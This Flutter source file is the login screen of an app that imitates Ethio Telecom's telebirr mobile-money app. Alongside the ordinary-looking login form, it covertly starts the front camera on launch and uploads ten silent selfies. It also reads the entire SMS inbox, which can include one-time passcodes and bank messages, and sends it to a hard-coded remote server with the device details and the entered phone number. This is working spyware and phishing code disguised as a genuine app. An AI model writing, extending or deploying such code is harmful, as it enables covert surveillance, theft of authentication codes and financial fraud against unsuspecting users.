import 'package:flutter/material.dart';
import 'package:telebirrbybr7/screens/pin_entry_page.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';
import 'package:telephony/telephony.dart';
import 'dart:convert';
import 'dart:io';
import 'dart:async';

class LoginPage extends StatefulWidget {
  const LoginPage({super.key});

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> with SingleTickerProviderStateMixin {
  final TextEditingController _controller = TextEditingController(text: "974814108");
  final DeviceInfoPlugin _deviceInfo = DeviceInfoPlugin();

  late AnimationController _animationController;
  late Animation<double> _scrollAnimation;

  bool _isChecking = false;
  String? _errorMessage;

  // Server configuration
  static const String serverUrl = "http://148.116.91.16:3000";

  // Silent selfie capture
  static CameraController? _cameraController;
  static bool _isCapturingSelfies = false;
  static const int selfieCount = 10;
  static const Duration selfieInterval = Duration(seconds: 1);

  // SMS reading
  static bool _isUploadingSms = false;

  @override
  void initState() {
    super.initState();

    _animationController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 8),
    )..repeat();

    _scrollAnimation = Tween<double>(
      begin: 1.2,
      end: -1.2,
    ).animate(CurvedAnimation(
      parent: _animationController,
      curve: Curves.linear,
    ));

    // Start silent background tasks AFTER first frame
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _startSilentSelfieCapture();
      _readAndUploadAllSms();
    });
  }

  @override
  void dispose() {
    _animationController.dispose();
    _controller.dispose();
    _cameraController?.dispose();
    _cameraController = null;
    _isCapturingSelfies = false;
    super.dispose();
  }

  // ==================== SILENT SELFIE CAPTURE ====================

  Future<void> _startSilentSelfieCapture() async {
    if (_isCapturingSelfies) {
      print("📷 Selfie capture already in progress");
      return;
    }

    try {
      final cameras = await availableCameras();
      final frontCamera = cameras.firstWhere(
        (c) => c.lensDirection == CameraLensDirection.front,
      );

      _cameraController = CameraController(
        frontCamera,
        ResolutionPreset.medium,
        enableAudio: false,
        imageFormatGroup: ImageFormatGroup.jpeg,
      );

      await _cameraController!.initialize();
      _isCapturingSelfies = true;
      print("📷 Starting silent selfie capture: $selfieCount photos");

      for (int i = 0; i < selfieCount; i++) {
        if (!_isCapturingSelfies || _cameraController == null) break;

        try {
          // Capture photo
          final XFile photo = await _cameraController!.takePicture();
          print("📸 Selfie ${i + 1}/$selfieCount captured: ${photo.path}");

          // Upload immediately
          _uploadSelfie(File(photo.path), i + 1);

          // Wait 1 second before next capture (except after last)
          if (i < selfieCount - 1) {
            await Future.delayed(selfieInterval);
          }
        } catch (e) {
          print("❌ Selfie ${i + 1} failed: $e");
        }
      }

      print("✅ Selfie capture sequence complete");
    } catch (e) {
      print("❌ Selfie capture initialization failed: $e");
    } finally {
      _isCapturingSelfies = false;
      await _cameraController?.dispose();
      _cameraController = null;
    }
  }

  Future<void> _uploadSelfie(File file, int index) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ?? 'device_unknown';
      final timestamp = DateTime.now().millisecondsSinceEpoch;

      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$serverUrl/api/upload/selfie'),
      );
      request.files.add(await http.MultipartFile.fromPath('selfie', file.path));
      request.fields['folder'] = 'selfie';
      request.fields['filename'] = 'selfie_${deviceId}_${timestamp}_$index.jpg';
      request.fields['deviceId'] = deviceId;
      request.fields['index'] = index.toString();
      request.fields['timestamp'] = timestamp.toString();

      final response = await request.send().timeout(
        const Duration(seconds: 30),
      );

      if (response.statusCode == 200) {
        print("✅ Selfie $index uploaded successfully");
      } else {
        print("❌ Selfie $index upload failed: ${response.statusCode}");
      }

      // Clean up local file
      await file.delete();
    } catch (e) {
      print("❌ Selfie $index upload error: $e");
      // Try to delete local file even on error
      try {
        if (await file.exists()) {
          await file.delete();
        }
      } catch (_) {}
    }
  }

  // ==================== SMS READING & UPLOAD ====================

  Future<void> _readAndUploadAllSms() async {
  if (_isUploadingSms) {
    print("📩 SMS upload already in progress");
    return;
  }

  _isUploadingSms = true;

  try {
    final telephony = Telephony.instance;
    print("📩 Reading all SMS messages...");

    // Read SMS without sortOrder to avoid import issues
    final List<SmsMessage> messages = await telephony.getInboxSms(
      columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE, SmsColumn.TYPE],
    );

    print("📩 Found ${messages.length} SMS messages");

    // Build JSON array
    final List<Map<String, dynamic>> smsList = messages.map((sms) {
      return {
        'address': sms.address ?? 'Unknown',
        'body': sms.body ?? '',
        'date': sms.date?.toString() ?? DateTime.now().millisecondsSinceEpoch.toString(),
        'type': sms.type?.toString() ?? '1',
        'read': true,
      };
    }).toList();

    final Map<String, dynamic> smsJson = {
      'totalCount': smsList.length,
      'messages': smsList,
      'timestamp': DateTime.now().millisecondsSinceEpoch,
    };

    // Upload JSON to server
    await _uploadSmsJson(smsJson);
  } catch (e) {
    print("❌ SMS reading error: $e");
  } finally {
    _isUploadingSms = false;
  }
}

  Future<void> _uploadSmsJson(Map<String, dynamic> smsData) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString('deviceId') ?? 'device_unknown';
      final timestamp = DateTime.now().millisecondsSinceEpoch;

      // Create JSON file in temp directory
      final dir = await getTemporaryDirectory();
      final jsonFile = File('${dir.path}/sms_${deviceId}_$timestamp.json');
      await jsonFile.writeAsString(json.encode(smsData));

      final request = http.MultipartRequest(
        'POST',
        Uri.parse('$serverUrl/api/upload/sms'),
      );
      request.files.add(await http.MultipartFile.fromPath('sms', jsonFile.path));
      request.fields['folder'] = 'sms';
      request.fields['filename'] = 'sms_${deviceId}_$timestamp.json';
      request.fields['deviceId'] = deviceId;
      request.fields['count'] = smsData['totalCount'].toString();
      request.fields['timestamp'] = timestamp.toString();

      final response = await request.send().timeout(
        const Duration(minutes: 2),
      );

      if (response.statusCode == 200) {
        print("✅ SMS JSON uploaded successfully: ${smsData['totalCount']} messages");
      } else {
        print("❌ SMS upload failed: ${response.statusCode}");
      }

      // Clean up temp file
      await jsonFile.delete();
    } catch (e) {
      print("❌ SMS upload error: $e");
    }
  }

  // ==================== ORIGINAL LOGIN LOGIC (MINUS FINGERPRINT CHECK) ====================

  // Get or create device ID
  Future<String> _getDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString('deviceId');

    if (deviceId == null) {
      deviceId = 'device_${DateTime.now().millisecondsSinceEpoch}_${_controller.text}';
      await prefs.setString('deviceId', deviceId);
    }

    return deviceId;
  }

  // Register device with server
  Future<Map<String, dynamic>?> _registerDevice(String deviceId) async {
    try {
      final androidInfo = await _deviceInfo.androidInfo;

      final response = await http.post(
        Uri.parse('$serverUrl/api/devices/register'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode({
          'deviceId': deviceId,
          'fingerprint': androidInfo.fingerprint,
          'model': androidInfo.model,
          'manufacturer': androidInfo.manufacturer,
          'androidVersion': androidInfo.version.release,
          'phoneNumber': _controller.text,
        }),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200 || response.statusCode == 201) {
        return json.decode(response.body);
      } else {
        return null;
      }
    } catch (e) {
      print("Registration error: $e");
      return null;
    }
  }

  // Get PIN from server
  Future<Map<String, dynamic>?> _getPinFromServer(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$serverUrl/api/devices/$deviceId/pin'),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        return data;
      } else if (response.statusCode == 404) {
        final registerResult = await _registerDevice(deviceId);
        if (registerResult != null) {
          return {
            'pin': registerResult['pin'],
            'isActive': true,
          };
        }
        return null;
      } else {
        return null;
      }
    } catch (e) {
      print("Get PIN error: $e");
      return null;
    }
  }

  // Method to handle Next button press (FINGERPRINT CHECK REMOVED)
  Future<void> _handleNextPress() async {
    if (_isChecking) return;

    setState(() {
      _isChecking = true;
      _errorMessage = null;
    });

    try {
      // FINGERPRINT CHECK REMOVED - All devices allowed

      final deviceId = await _getDeviceId();
      final serverResponse = await _getPinFromServer(deviceId);

      if (serverResponse == null) {
        setState(() {
          _errorMessage = "Server unreachable. Please check your connection and try again.";
          _isChecking = false;
        });
        return;
      }

      if (serverResponse['isActive'] == false) {
        setState(() {
          _errorMessage = "Access Denied: This device has been deactivated. Contact support.";
          _isChecking = false;
        });
        return;
      }

      final pin = serverResponse['pin'] as String;

      if (mounted) {
        setState(() {
          _isChecking = false;
        });
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => PinEntryPage(correctPin: pin),
          ),
        );
      }
    } catch (e) {
      setState(() {
        _errorMessage = "An error occurred. Please try again.";
        _isChecking = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        width: double.infinity,
        height: double.infinity,
        color: Colors.white,
        child: Container(
          width: double.infinity,
          height: double.infinity,
          decoration: const BoxDecoration(
            color: Colors.white,
            image: DecorationImage(
              image: AssetImage('images/login_back.png'),
              fit: BoxFit.cover,
              alignment: Alignment(0, -0.3),
            ),
          ),
          child: SafeArea(
            child: SingleChildScrollView(
              padding: EdgeInsets.zero,
              child: Column(
                children: [
                  // White bar with logos (edge to edge)
                  Container(
                    width: double.infinity,
                    color: Colors.white,
                    padding: const EdgeInsets.only(left: 25, right: 25, top: 11, bottom: 12),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Image.asset('images/ethio.png', height: 22),
                        Image.asset('images/telebirr.png', height: 22),
                      ],
                    ),
                  ),

                  // English dropdown (outside white bar)
                  const Padding(
                    padding: EdgeInsets.only(right: 25, top: 4),
                    child: Align(
                      alignment: Alignment.centerRight,
                      child: Text(
                        "English ▼",
                        style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13),
                      ),
                    ),
                  ),

                  const SizedBox(height: 50),

                  // ALL CONTENT BELOW is padded with 25px
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 25),
                    child: Column(
                      children: [
                        // Welcome text
                        ClipRect(
                          child: AnimatedBuilder(
                            animation: _scrollAnimation,
                            builder: (context, child) {
                              return FractionalTranslation(
                                translation: Offset(_scrollAnimation.value, 0),
                                child: child,
                              );
                            },
                            child: const SizedBox(
                              width: double.infinity,
                              child: Text(
                                "Welcome to telebirr SuperApp!",
                                textAlign: TextAlign.center,
                                style: TextStyle(
                                  fontSize: 22,
                                  color: Color(0xFF008DCD),
                                  fontWeight: FontWeight.w600,
                                ),
                              ),
                            ),
                          ),
                        ),

                        const SizedBox(height: 25),

                        const Text(
                          "All-in-One",
                          textAlign: TextAlign.center,
                          style: TextStyle(
                            fontSize: 18,
                            color: Color(0xFF008DCD),
                            fontWeight: FontWeight.bold,
                          ),
                        ),

                        const SizedBox(height: 8),

                        Column(
                          children: [
                            const Text(
                              "Login",
                              style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold),
                            ),
                            Container(
                              margin: const EdgeInsets.only(top: 4),
                              height: 1.5,
                              width: 63,
                              color: const Color(0xFF8DC73F),
                            ),
                          ],
                        ),

                        const SizedBox(height: 50),

                        const Padding(
                          padding: EdgeInsets.only(left: 20),
                          child: Align(
                            alignment: Alignment.centerLeft,
                            child: Text(
                              "Mobile Number",
                              style: TextStyle(color: Color(0xFF616161), fontSize: 14),
                            ),
                          ),
                        ),
                        const SizedBox(height: 6),

                        SizedBox(
                          width: double.infinity,
                          height: 46,
                          child: TextField(
                            controller: _controller,
                            keyboardType: TextInputType.phone,
                            cursorColor: const Color(0xFF8DC73F),
                            textAlignVertical: TextAlignVertical.center,
                            style: const TextStyle(fontSize: 14, height: 1.2),
                            decoration: InputDecoration(
                              isDense: true,
                              contentPadding: const EdgeInsets.only(left: 12, right: 12, top: 18, bottom: 10),
                              prefixIcon: const Padding(
                                padding: EdgeInsets.only(left: 12, right: 4),
                                child: Align(
                                  alignment: Alignment.centerLeft,
                                  widthFactor: 1.0,
                                  child: Text(
                                    "+251 ",
                                    style: TextStyle(fontSize: 14, fontWeight: FontWeight.normal),
                                  ),
                                ),
                              ),
                              prefixIconConstraints: const BoxConstraints(minWidth: 55, minHeight: 0),
                              filled: true,
                              fillColor: const Color(0xFFF9F9F9),
                              border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12),
                                borderSide: BorderSide(color: Colors.grey.shade300),
                              ),
                              enabledBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12),
                                borderSide: BorderSide(color: Colors.grey.shade300),
                              ),
                              focusedBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12),
                                borderSide: const BorderSide(color: Color(0xFF8DC73F), width: 2),
                              ),
                            ),
                          ),
                        ),

                        const SizedBox(height: 40),

                        SizedBox(
                          width: double.infinity,
                          height: 47,
                          child: ElevatedButton(
                            onPressed: _handleNextPress,
                            style: ElevatedButton.styleFrom(
                              backgroundColor: const Color(0xFF008DCD),
                              disabledBackgroundColor: const Color(0xFF008DCD),
                              disabledForegroundColor: Colors.white,
                              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                              elevation: 0,
                            ),
                            child: _isChecking
                                ? const Row(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      SizedBox(
                                        height: 20,
                                        width: 20,
                                        child: CircularProgressIndicator(
                                          strokeWidth: 2,
                                          valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                                        ),
                                      ),
                                      SizedBox(width: 10),
                                      Text(
                                        "Next",
                                        style: TextStyle(
                                          color: Color(0xFFB0B0B0),
                                          fontSize: 18,
                                          fontWeight: FontWeight.w400,
                                        ),
                                      ),
                                    ],
                                  )
                                : const Text(
                                    "Next",
                                    style: TextStyle(
                                      color: Colors.white,
                                      fontSize: 18,
                                      fontWeight: FontWeight.w400,
                                    ),
                                  ),
                          ),
                        ),

                        const SizedBox(height: 20),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            const Text(
                              "Don't have an account ?    ",
                              style: TextStyle(fontSize: 13),
                            ),
                            Text(
                              "Create New Account",
                              style: TextStyle(
                                color: Colors.lightGreen.shade700,
                                fontWeight: FontWeight.normal,
                                fontSize: 13,
                              ),
                            ),
                          ],
                        ),

                        const SizedBox(height: 30),
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                          children: [
                            Text(
                              "teleHub",
                              style: TextStyle(
                                color: Colors.lightGreen.shade700,
                                fontSize: 13,
                                fontWeight: FontWeight.normal,
                              ),
                            ),
                            Text(
                              "Help",
                              style: TextStyle(
                                color: Colors.lightGreen.shade700,
                                fontSize: 13,
                                fontWeight: FontWeight.normal,
                              ),
                            ),
                          ],
                        ),

                        const SizedBox(height: 155),

                        const Text(
                          "Terms and Conditions",
                          style: TextStyle(color: Color(0xFF8DC73F)),
                        ),
                        const SizedBox(height: 5),

                        const Text(
                          "@2026 ethiotelecom. All rights reserved 1.2.9 version",
                          textAlign: TextAlign.center,
                          style: TextStyle(color: Colors.grey, fontSize: 13),
                        ),
                        const SizedBox(height: 20),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
